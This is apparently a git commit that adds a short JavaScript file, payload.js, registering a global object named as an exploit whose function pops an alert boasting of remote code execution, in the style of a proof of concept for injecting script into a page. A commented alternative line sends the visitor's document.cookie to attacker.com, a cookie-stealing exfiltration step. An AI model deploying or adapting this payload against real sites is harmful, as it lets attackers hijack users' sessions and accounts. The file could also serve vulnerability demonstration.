c0689aea3eba6c381a144d79c6c4e78d1417d585
Baali07 <amerziko70@gmail.com>
2025-07-21 00:20:34 +0100

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,6 @@
+window["tb-real-xploit@1.0.0"] = {
+  create: function() {
+    alert("🔥 Remote Code Execution by G9!");
+    // أو: fetch('https://attacker.com/steal?cookie=' + document.cookie)
+  }
+};
